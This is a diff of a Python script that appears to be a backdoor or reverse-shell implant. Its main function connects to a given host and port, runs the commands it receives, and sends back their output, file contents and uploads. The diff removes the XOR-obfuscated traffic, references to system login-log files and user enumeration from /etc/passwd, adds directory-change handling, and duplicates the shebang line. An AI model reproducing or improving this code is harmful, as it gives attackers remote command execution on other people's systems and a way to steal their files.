@@ -1,38 +1,20 @@
 #!/usr/bin/env python
+#!/usr/bin/env python
 import os, sys, re, signal
 import socket
 import time
-from subprocess import Popen,PIPE,STDOUT,call
 from base64 import *
-import platform
-import urllib2
-import random, string
-import logging
-import struct
-import getpass
-import pwd
-import thread
-import operator
-import SocketServer, SimpleHTTPServer
-from math import log
+from subprocess import Popen,PIPE,STDOUT,call
 
 
 socksize = 4096                            
 activePID = []
-UTMP_STRUCT_SIZE    = 384
-LASTLOG_STRUCT_SIZE = 292
-UTMP_FILEPATH       = "/var/run/utmp"
-WTMP_FILEPATH       = "/var/log/wtmp"
-LASTLOG_FILEPATH    = "/var/log/lastlog"
-distro = os.uname()[1]
-distro2 = platform.linux_distribution()[0]
 Home_Dir = os.environ['HOME']
-User_Ip_Address = socket.gethostbyname(socket.gethostname())
 if os.geteuid() != 0:
     currentuser = "nonroot"
 else:
     currentuser = "root"
-    
+
 
 def xor(string, key):
     data = ''
@@ -42,27 +24,23 @@ def xor(string, key):
         data += char
     return data
 
+
 def module_handler(module, modname):
-    status_msg("\n[~] Module: %s\n" % modname)
-    status_msg("[~] Start time: %s" % logtime)
+    status_msg("[~] Module: %s\n" % modname)
     exec(module)
-    connection.send(xor("shell => ", pin))
+    connection.send("shell => ")
 
 
 def status_msg(message):
-    connection.send(xor("%s" % message, pin))
-
-
-def log_msg(message):
-    connection.send(xor(":log %s" % message, pin))
+    connection.send("%s" % message)
 
 
 def cat_file(filename):
     if os.path.exists(filename) and os.access(filename, os.R_OK):
         catfile = open(filename, "rb")
-        connection.send(xor("[*] Contents of %s" % filename, pin))
+        connection.send("[*] Contents of %s" % filename)
         for lines in catfile.readlines():
-            connection.sendall(xor( lines ,pin))
+            connection.sendall(lines)
         catfile.close()
 
 
@@ -71,9 +49,9 @@ def save_file(filename):
         savefile = open(filename, "rb")
         filedata = savefile.read()
         savefile.close()
-        connection.send(xor(":savef %s" % filename, pin))
+        connection.send(":savef %s" % filename)
         time.sleep(2)
-        connection.sendall(xor( filedata , pin))
+        connection.sendall( filedata )
     else:
         pass
 
@@ -86,7 +64,8 @@ def cmd_exec(command):
                stdin=PIPE,
                )
     stdout, stderr = proc.communicate()
-    connection.sendall(xor( stdout , pin))              # Send output back to the client
+    connection.sendall( stdout )
+
 
 def cmd2txt(command, textfile):
     os.system("%s > %s" % (command, textfile))
@@ -94,27 +73,7 @@ def cmd2txt(command, textfile):
     os.system("rm %s" % textfile)
 
 
-def whereis(program):
-    for path in os.environ.get('PATH', '').split(':'):
-        if os.path.exists(os.path.join(path, program)) and \
-            not os.path.isdir(os.path.join(path, program)):
-                return os.path.join(path, program)
-    return None
-    
-
-def users():
-    global userlist
-    userlist = []
-    if os.access('/etc/passwd', os.R_OK):
-        passwd = open('/etc/passwd')
-        for line in passwd:
-            fields = line.split(':')
-            uid = int(fields[2])
-            if uid > 500 and uid < 32328:
-                userlist.append(fields[0])
-
-
-def main():
+def main(HOST, PORT, pin):
     global connection
     connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -134,6 +93,20 @@ def main():
              stdin=PIPE,
              )
         stdout, stderr = proc.communicate()
+
+        if cmd.startswith('cd'):
+            try:
+                destination = cmd[3:].replace('\n','')
+                if os.path.isdir(destination):
+                    os.chdir(destination)
+                    current = os.getcwd()
+                    connection.send("[*] current directory: %s" % current)
+                    connection.send("shell => ")
+                else:
+                    connection.send("[!] Directory does not exist") 
+                    connection.send("shell => ")
+            except IndexError:
+                pass
 
         if cmd2.startswith(":upload"):
             getname = cmd2.split(" ")
@@ -188,3 +161,5 @@ def main():
 
     connection.close() 
     os._exit(0)
+
+
